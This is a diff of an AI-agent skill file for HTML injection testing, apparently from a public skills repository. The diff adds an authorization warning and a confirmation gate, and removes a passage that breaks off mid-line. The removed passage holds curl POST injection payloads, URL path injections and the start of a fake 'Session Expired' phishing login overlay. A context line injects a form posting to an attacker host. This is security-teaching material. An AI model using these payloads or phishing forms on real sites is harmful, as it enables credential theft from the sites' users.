@@ -8,6 +8,20 @@ url: https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/html
 ---
 
 
+> **⚠️ AUTHORIZED USE ONLY**
+> This skill is for educational purposes or authorized security assessments only.
+> You must have explicit, written permission from the system owner before using this tool.
+> Misuse of this tool is illegal and strictly prohibited.
+
+> **Mandatory confirmation gate**
+> Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
+> 1. Ask the user to state the exact target URL, IP, account, or resource.
+> 2. Ask the user to confirm written authorization and the permitted scope.
+> 3. Show the exact command(s) and explain their expected effect.
+> 4. Wait for explicit confirmation in the current conversation.
+>
+> Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.
+
 > AUTHORIZED USE ONLY: Use this skill only for authorized security assessments, defensive validation, or controlled educational environments.
 
 # HTML Injection Testing
@@ -173,40 +187,4 @@ http://target.com/welcome?name=<h1>Welcome%20Admin</h1><form%20action="http://at
 http://target.com/search?q=<marquee>Your%20account%20has%20been%20compromised</marquee>
 ```
 
-#### Reflected POST Injection
-
-Payload in POST data:
-
-```bash
-# POST injection test
-curl -X POST -d "comment=<div style='color:red'>Malicious Content</div>" \
-     http://target.com/submit
-
-# Form field injection
-curl -X POST -d "name=<script>alert(1)</script>&email=test@test.com" \
-     http://target.com/register
-```
-
-#### URL-Based Injection
-
-Inject into displayed URLs:
-
-```html
-<!-- If URL is displayed on page -->
-http://target.com/page/<h1>Injected</h1>
-
-<!-- Path-based injection -->
-http://target.com/users/<img src=x>/profile
-```
-
-### Phase 5: Phishing Attack Construction
-
-Create convincing phishing forms:
-
-```html
-<!-- Fake login form overlay -->
-<div style="position:fixed;top:0;left:0;width:100%;height:100%;
-            background:white;z-index:9999;padding:50px;">
-    <h2>Session Expired</h2>
-    <p>Your session has expired. Please log in again.</p>
-    <form act
+#### Reflected POST Inject
